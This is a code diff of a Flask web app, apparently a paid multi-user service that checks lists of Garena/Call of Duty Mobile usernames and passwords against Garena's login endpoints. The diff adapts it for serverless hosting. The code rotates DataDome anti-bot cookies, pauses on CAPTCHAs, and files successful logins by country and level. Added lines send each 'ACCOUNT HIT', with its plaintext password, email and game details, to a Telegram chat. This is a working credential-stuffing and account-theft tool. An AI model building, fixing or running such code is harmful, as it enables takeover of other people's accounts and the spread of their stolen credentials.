@@ -1,4 +1,4 @@
-# --- START OF FILE app.py ---
+# --- START OF FIXED app.py ---
 
 import os
 import sys
@@ -37,9 +37,10 @@ KEY_DATA_FILE = os.path.join(APP_DATA_DIR, 'keys.json')
 PROGRESS_STATE_FILE = os.path.join(APP_DATA_DIR, 'progress_state.json')
 
 # --- Ensure necessary packages are installed ---
+# FIXED: Removed terminal-only libraries that crash on Vercel
 import requests
-from tqdm import tqdm
-from colorama import Fore, Style, init
+# from tqdm import tqdm # This is not needed for the web version
+# from colorama import Fore, Style, init # This crashes on Vercel
 from Crypto.Cipher import AES
 # Import placeholder modules
 import change_cookie
@@ -47,8 +48,8 @@ import ken_cookie
 import cookie_config
 import set_cookie
 
-# Initialize Colorama for server-side logs
-init(autoreset=True)
+# FIXED: Do not initialize colorama on a serverless platform
+# init(autoreset=True)
 
 # --- Flask App Setup ---
 app = Flask(__name__)
@@ -142,7 +143,7 @@ def admin_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-# --- START OF ORIGINAL CHECKER FUNCTIONS ---
+# --- START OF CHECKER HELPER FUNCTIONS ---
 
 def log_message(message, color_class='text-white'):
     clean_message = strip_ansi_codes_jarell(message)
@@ -206,7 +207,7 @@ def get_datadome_cookie(pbar_placeholder=None):
         cookie_string = response.json()['cookie']
         log_message("[🍪] Successfully fetched a new DataDome cookie from server.", "text-success")
         return cookie_string.split(';')[0].split('=')[1]
-    except requests.exceptions.RequestException: return None
+    except (requests.exceptions.RequestException, KeyError): return None
 
 def fetch_new_datadome_pool(num_cookies=5):
     log_message(f"[⚙️] Attempting to fetch {num_cookies} new DataDome cookies...", "text-info")
@@ -233,7 +234,7 @@ def save_datadome_cookie(cookie_value):
         save_data(file_path, cookie_pool)
         log_message("[💾] New DataDome Cookie saved to pool.", "text-info")
 
-def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module, pbar=None):
+def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module):
     cookies["datadome"] = dataa
     login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
     try:
@@ -259,7 +260,16 @@ def check_login(account_username, _id, encryptedpassword, password, selected_hea
         init_json_response = init_response.json()
     except (requests.RequestException, json.JSONDecodeError) as e: return f"[ERROR] Bind check failed: {e}"
     if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Unknown error during bind check')}"
-    bindings = {item.split(":", 1)[0]: item.split(":", 1)[1].strip() for item in init_json_response.get('bindings', []) if ":" in item}
+    
+    bindings = {}
+    raw_bindings = init_json_response.get('bindings', [])
+    for item in raw_bindings:
+        if ":" in item:
+            parts = item.split(":", 1)
+            bindings[parts[0].strip()] = parts[1].strip()
+
+    is_clean = "Clean" in init_json_response.get('status', "")
+
     save_datadome_cookie(dataa)
     head = {"User-Agent": selected_header["User-Agent"], "Referer": "https://auth.garena.com/"}
     data_payload = {"client_id": "100082", "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"}
@@ -276,7 +286,7 @@ def check_login(account_username, _id, encryptedpassword, password, selected_hea
             else:
                 codm_nickname, codm_level, codm_region, uid = game_info.split("|")
                 connected_games = [f"  Nickname: {codm_nickname}\n  Level: {codm_level}\n  Region: {codm_region}\n  UID: {uid}"] if uid and uid != 'N/A' else ["No CODM account found"]
-            return format_result(bindings, init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m", date, account_username, password, codm_level, connected_games)
+            return format_result(bindings, is_clean, date, account_username, password, codm_level, connected_games)
         else: return f"[FAILED] 'access_token' not found in grant response."
     except (requests.RequestException, json.JSONDecodeError) as e: return f"[FAILED] Token grant failed: {e}"
 
@@ -295,7 +305,7 @@ def show_level(access_token, selected_header, sso, token, newdate, cookie):
             user = data["user"]
             return f"{user.get('codm_nickname', 'N/A')}|{user.get('codm_level', 'N/A')}|{user.get('region', 'N/A')}|{user.get('uid', 'N/A')}"
         else: return "[FAILED] NO CODM ACCOUNT!"
-    except (requests.RequestException, json.JSONDecodeError, KeyError, IndexError) as e: return f"[FAILED] CODM data fetch error: {e}"
+    except (requests.RequestException, json.JSONDecodeError, KeyError, IndexError, TypeError) as e: return f"[FAILED] CODM data fetch error: {e}"
 
 def format_result(bindings, is_clean, date, username, password, codm_level, connected_games):
     bool_status_text = lambda status_str: "True ✔" if status_str == 'True' else "False ❌"
@@ -311,9 +321,22 @@ def format_result(bindings, is_clean, date, username, password, codm_level, conn
 
     codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
     telegram_message = None
-    if has_codm and telegram_level_filter != 'none':
+    if has_codm:
         tg_codm_info = "\n".join([f"  <code>{html.escape(line.strip())}</code>" for line in connected_games[0].strip().split('\n')])
-        telegram_message = f"""...""" # Telegram message formatting here
+        telegram_message = f"""✅ <b>GARENA ACCOUNT HIT</b> ✅
+- - - - - - - - - - - - - - - - -
+🔑 <b><u>Credentials:</u></b>
+  <b>User:</b> <code>{html.escape(username)}</code>
+  <b>Pass:</b> <code>{html.escape(password)}</code>
+- - - - - - - - - - - - - - - - -
+📊 <b><u>Account Info:</u></b>
+  <b>Country:</b> {html.escape(bindings.get("Country", "N/A"))}
+  <b>Email:</b> <code>{html.escape(bindings.get("eta", "N/A"))}</code>
+- - - - - - - - - - - - - - - - -
+🎮 <b><u>CODM Details:</u></b>
+{tg_codm_info}
+- - - - - - - - - - - - - - - - -
+<i>Presented By: @YourHandle</i>""".strip()
 
     country_folder = "Others"
     for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
@@ -326,7 +349,8 @@ def format_result(bindings, is_clean, date, username, password, codm_level, conn
         elif 51 <= codm_level_num <= 100: level_range = "51-100"
         elif codm_level_num > 100: level_range = f"{((codm_level_num-1)//100)*100+1}-{((codm_level_num-1)//100+1)*100}"
 
-    file_to_write = os.path.join(get_results_directory(), country_folder, f"{level_range}_{'clean' if is_clean else 'not_clean'}.txt")
+    country_path = os.path.join(get_results_directory(), country_folder)
+    file_to_write = os.path.join(country_path, f"{level_range}_{'clean' if is_clean else 'not_clean'}.txt")
     content_to_write = console_message + "\n" + "=" * 60 + "\n"
     return (console_message, telegram_message, codm_level_num, bindings.get("Country", "N/A"), username, password, bindings.get("Garena Shells", "0"), has_codm, is_clean, file_to_write, content_to_write)
 
@@ -335,7 +359,7 @@ def get_request_data(selected_cookie_module):
     headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'}
     return cookies, headers
 
-def check_account(username, password, date, datadome_cookie, selected_cookie_module, pbar=None):
+def check_account(username, password, date, datadome_cookie, selected_cookie_module):
     for attempt in range(3):
         try:
             random_id = "17290585" + str(random.randint(10000, 99999))
@@ -346,7 +370,7 @@ def check_account(username, password, date, datadome_cookie, selected_cookie_mod
             if response.status_code == 200:
                 data = response.json()
                 if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
-                return check_login(username, random_id, getpass(password, data['v1'], data['v2']), password, headers, cookies, response.cookies.get('datadome') or datadome_cookie, date, selected_cookie_module, pbar)
+                return check_login(username, random_id, getpass(password, data['v1'], data['v2']), password, headers, cookies, response.cookies.get('datadome') or datadome_cookie, date, selected_cookie_module)
             else: return f"[FAILED] HTTP Status: {response.status_code}"
         except requests.exceptions.RequestException as e:
             if attempt < 2: time.sleep(5); continue
@@ -374,11 +398,10 @@ def remove_duplicates_from_file(file_path):
 def clear_progress():
     if os.path.exists(PROGRESS_STATE_FILE): os.remove(PROGRESS_STATE_FILE)
 
-# --- END OF ORIGINAL CHECKER FUNCTIONS ---
+# --- CHECKER TASK ---
 
 def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number, user_id):
-    """The main background task for checking accounts. MODIFIED for multi-user."""
-    global check_status, stop_event, captcha_pause_event, telegram_level_filter
+    global check_status, stop_event, captcha_pause_event
     current_user = get_user_by_id(user_id)
     is_premium = is_user_premium(current_user)
     log_message(f"[👤] Job started for user: {current_user.get('username', 'Unknown')}", "text-info")
@@ -395,18 +418,18 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
         date = str(int(time.time()))
         accounts = remove_duplicates_from_file(file_path)
 
+        accounts_to_process = accounts if is_premium else accounts[:FREE_TIER_LIMIT]
         if not is_premium and len(accounts) > FREE_TIER_LIMIT:
-            accounts_to_process = accounts[:FREE_TIER_LIMIT]
             log_message(f"File has {len(accounts)} lines, but will only process {FREE_TIER_LIMIT}.", "text-warning")
-        else:
-            accounts_to_process = accounts
 
         total_to_process = len(accounts_to_process)
         with status_lock:
             check_status['total'] = total_to_process; check_status['progress'] = 0; check_status['stats'] = stats
 
+        cookie_pool_path = os.path.join(get_app_data_directory(), "datadome_cookies.json")
         cookie_pool = [c.get('datadome') for c in cookie_config.COOKIE_POOL] if use_cookie_set else \
-                      [c.get('datadome') for c in load_data(os.path.join(get_app_data_directory(), "datadome_cookies.json")) if 'datadome' in c]
+                      [c.get('datadome') for c in load_data(cookie_pool_path) if isinstance(c, dict) and 'datadome' in c]
+
         if not cookie_pool: cookie_pool = fetch_new_datadome_pool()
         if not cookie_pool: stop_event.set(); log_message("[❌] No DataDome cookies available. Stopping.", "text-danger")
 
@@ -425,7 +448,7 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     if result == "[CAPTCHA]":
                         stats['captcha_count'] += 1; log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
                         with status_lock: check_status['captcha_detected'] = True
-                        captcha_pause_event.clear(); captcha_pause_event.wait(timeout=60)
+                        captcha_pause_event.clear(); captcha_pause_event.wait(timeout=60) # Wait for UI interaction
                         with status_lock: check_status['captcha_detected'] = False
                         if stop_event.is_set(): break
                         log_message("[🔄] Resuming check for the same account...", "text-info"); continue
@@ -437,7 +460,9 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
                     with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
                     if telegram_message and (telegram_level_filter == 'all' or (telegram_level_filter == '100+' and codm_level_num >= 100)):
-                        if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message): stats['telegram_sent'] += 1
+                        if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message):
+                            log_message(f"[✅ TG] Notification sent for {username}.", "text-info")
+                            stats['telegram_sent'] += 1
                 elif result:
                     stats['failed'] += 1
                     if "[🔐]" in result: stats['incorrect_pass'] += 1
@@ -451,14 +476,18 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 check_status['progress'] = total_to_process
                 check_status['final_summary'] = f"--- CHECKING COMPLETE ---\nProcessed: {total_to_process} | Success: {stats['successful']} | Failed: {stats['failed']}"
             log_message("--- CHECKING COMPLETE ---", "text-success")
-    except Exception as e: log_message(f"An unexpected error occurred: {e}", "text-danger")
+    except Exception as e:
+        log_message(f"An unexpected error occurred in the checker task: {e}", "text-danger")
+        import traceback
+        log_message(traceback.format_exc(), "text-danger")
     finally:
-        if is_complete:
-            clear_progress()
-            if auto_delete:
-                try: os.remove(file_path)
-                except OSError as e: log_message(f"Failed to delete source file: {e}", "text-danger")
+        if is_complete and auto_delete:
+            try:
+                os.remove(file_path)
+                log_message(f"Source file '{os.path.basename(file_path)}' has been deleted.", "text-info")
+            except OSError as e: log_message(f"Failed to delete source file: {e}", "text-danger")
         with status_lock: check_status['running'] = False
+
 
 # --- AUTH & USER MANAGEMENT ROUTES ---
 @app.route('/')
@@ -513,18 +542,22 @@ def redeem():
     if request.method == 'POST':
         key_code = request.form.get('key_code')
         keys = load_data(KEY_DATA_FILE); users = load_data(USER_DATA_FILE)
-        target_key = next((k for k in keys if k['key'] == key_code), None)
-        if not target_key: flash('Invalid key.', 'danger')
-        elif target_key.get('is_redeemed'): flash('This key has already been used.', 'danger')
+        target_key = next((k for k in keys if k['key'] == key_code and not k.get('is_redeemed')), None)
+        if not target_key:
+            flash('Invalid or already used key.', 'danger')
         else:
-            target_key['is_redeemed'] = True; target_key['redeemed_by'] = user['username']; target_key['redeemed_on'] = datetime.now().isoformat()
-            user_index = next((i for i, u in enumerate(users) if u['id'] == user['id']), -1)
-            if user_index != -1:
-                users[user_index]['redeemed_key'] = key_code; users[user_index]['key_expiry'] = target_key['expiry_date']
-                save_data(KEY_DATA_FILE, keys); save_data(USER_DATA_FILE, users)
-                flash(f"Key successfully redeemed! Premium expires on {datetime.fromisoformat(target_key['expiry_date']).strftime('%Y-%m-%d')}.", 'success')
-                return redirect(url_for('checker_page'))
-    return render_template('redeem.html', user=user, is_premium=is_user_premium(user))
+            expiry_date = datetime.fromisoformat(target_key['expiry_date'])
+            if expiry_date < datetime.now():
+                flash('This key has expired.', 'danger')
+            else:
+                target_key['is_redeemed'] = True; target_key['redeemed_by'] = user['username']; target_key['redeemed_on'] = datetime.now().isoformat()
+                user_index = next((i for i, u in enumerate(users) if u['id'] == user['id']), -1)
+                if user_index != -1:
+                    users[user_index]['redeemed_key'] = key_code; users[user_index]['key_expiry'] = target_key['expiry_date']
+                    save_data(KEY_DATA_FILE, keys); save_data(USER_DATA_FILE, users)
+                    flash(f"Key successfully redeemed! Premium expires on {expiry_date.strftime('%Y-%m-%d')}.", 'success')
+                    return redirect(url_for('checker_page'))
+    return render_template('redeem.html', user=user, is_premium=is_user_premium(user), FREE_TIER_LIMIT=FREE_TIER_LIMIT)
 
 # --- ADMIN PANEL ROUTES ---
 @app.route('/admin')
@@ -536,7 +569,9 @@ def admin_panel():
 @admin_required
 def get_admin_data():
     users = load_data(USER_DATA_FILE)
-    for u in users: del u['password_hash']
+    for u in users:
+        if 'password_hash' in u:
+            del u['password_hash']
     return jsonify({'users': users, 'keys': load_data(KEY_DATA_FILE)})
 
 @app.route('/api/admin/generate_key', methods=['POST'])
@@ -560,7 +595,7 @@ def generate_key():
 def checker_page():
     user = get_user_by_id(session['user_id'])
     bot_token, chat_id = load_telegram_config()
-    return render_template('index.html', user=user, is_premium=is_user_premium(user), bot_token=bot_token or '', chat_id=chat_id or '')
+    return render_template('index.html', user=user, is_premium=is_user_premium(user), FREE_TIER_LIMIT=FREE_TIER_LIMIT, bot_token=bot_token or '', chat_id=chat_id or '')
 
 @app.route('/start_check', methods=['POST'])
 @login_required
@@ -622,4 +657,5 @@ if __name__ == '__main__':
     initialize_data_files()
     app.run(host='127.0.0.1', port=5000, debug=True)
 else:
+    # This block runs on Vercel
     initialize_data_files()
